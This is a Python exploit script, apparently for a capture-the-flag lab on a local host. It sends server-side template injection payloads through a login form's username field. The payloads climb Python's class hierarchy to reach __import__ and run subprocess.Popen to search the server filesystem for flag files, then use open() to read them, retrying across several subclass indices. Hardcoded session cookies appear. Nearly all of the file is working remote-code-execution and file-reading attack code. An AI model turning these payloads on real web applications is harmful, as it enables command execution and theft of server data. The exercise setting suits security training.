import requests, re, sys

# Ultra-minimal SSTI tester
url = "http://127.0.0.1:33149/accounts/login"
s = requests.Session()
s.cookies['csrftoken'] = 'jqE7iouiUCsy1EBJ5An435pWHCysGJD4'
s.cookies['sessionid'] = '66u2wxpmyuyx2zfyxpyt7122z50a5vuy'

# Get CSRF token
try:
    r = s.get(url, timeout=10)
    csrf = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', r.text).group(1)
except:
    csrf = 'ul3a3DWJvBfgDxgTusfwVE3QzYJBAzrhDBx7bRgRf3xEu1HspSsqOziC6q7T68Ub'

# Critical payload: Find FLAG files using index 138
payload = "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').Popen(['find','/','-name','FLAG*','-type','f'],stdout=-1).communicate()[0].decode()}}"

try:
    resp = s.post(url, data={'csrfmiddlewaretoken':csrf,'username':payload,'password':'test','login':'submit'}, timeout=15, headers={'Referer':url})
    flag_files = resp.text
    # Check if find output contains any FLAG files
    if 'FLAG' in flag_files and not 'Login' in flag_files:
        # Extract potential FLAG file path
        paths = re.findall(r'/[^\s]+FLAG[^\s]*', flag_files)
        if paths:
            # Try to read the first found FLAG file
            target_path = paths[0].split('<')[0].split('>')[0]
            read_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['open']('{target_path}').read()}}}}"
            resp2 = s.post(url, data={'csrfmiddlewaretoken':csrf,'username':read_payload,'password':'test','login':'submit'}, timeout=15, headers={'Referer':url})
            flag_match = re.search(r'FLAG\{[^}]+\}', resp2.text)
            if flag_match:
                print(f"FLAG_FOUND:{target_path}:{flag_match.group(0)}")
                sys.exit(0)
except:
    pass

# Alternative index if 138 fails
for idx in [139,140,136,137,141,142]:
    try:
        payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('subprocess').Popen(['find','/','-name','FLAG*','-type','f'],stdout=-1).communicate()[0].decode()}}}}"
        resp = s.post(url, data={'csrfmiddlewaretoken':csrf,'username':payload,'password':'test','login':'submit'}, timeout=15, headers={'Referer':url})
        flag_files = resp.text
        if 'FLAG' in flag_files and not 'Login' in flag_files:
            paths = re.findall(r'/[^\s]+FLAG[^\s]*', flag_files)
            if paths:
                target_path = paths[0].split('<')[0].split('>')[0]
                read_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('{target_path}').read()}}}}"
                resp2 = s.post(url, data={'csrfmiddlewaretoken':csrf,'username':read_payload,'password':'test','login':'submit'}, timeout=15, headers={'Referer':url})
                flag_match = re.search(r'FLAG\{[^}]+\}', resp2.text)
                if flag_match:
                    print(f"FLAG_FOUND:{target_path}:{flag_match.group(0)}")
                    sys.exit(0)
    except:
        continue

print("No_FLAG_found")
